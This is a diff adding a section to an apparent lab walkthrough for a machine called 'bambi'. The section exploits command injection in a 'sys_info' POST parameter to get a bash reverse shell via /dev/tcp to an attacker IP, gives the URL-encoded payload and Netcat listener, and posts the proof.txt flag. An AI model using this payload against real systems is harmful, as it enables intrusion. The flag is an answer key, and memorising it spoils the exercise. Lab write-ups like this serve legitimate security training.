@@ -46,3 +46,49 @@ Now you should able to login with password - ANGELES for user - Sam and in admin
 
 ---
 
+## **PROOF.TXT**
+
+## **Intercept the System Info Page Post request**
+   
+![bambi_system_info_page](images/bambi_system_info_page.png) 
+
+- Here sys_info paramerer is vulnerable to command injection, here you can try ls or whoami command to verify it.
+
+![bambi_whoami](images/bambi_whoami.png) 
+
+- Now Check if bash exists by using command `which bash`
+
+![bambi_which_bash](images/bambi_which_bash.png) 
+
+- Now try a bash reverse shell.
+
+Payload:
+```
+;bash -c 'bash -i >& /dev/tcp/192.168.45.191/8090 0>&1'
+```
+
+- Now encode the payload.
+```
+;bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.191/8090%200%3E%261%27
+```
+
+Full Payload:
+```
+sys_info=ls;bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.191/8090%200%3E%261%27&sys_tracks=%2Fvar%2Fwww
+```
+
+![bambi_reverse_shell_payload](images/bambi_reverse_shell_payload.png) 
+
+
+- To obtain a revershell, set up a Netcat listener on our kali linux machine on port 8090 
+```
+nc -nlvp 8090
+```
+
+- Now you can get the reverse shell. There is a proof.txt file is present. Now read that flag.   
+
+![bambi_proof.txt_flag](images/bambi_proof.txt_flag.png)
+   
+### proof.txt flag: 3ab8fab58993ff44dd0f2f8fde04b2e8
+
+---
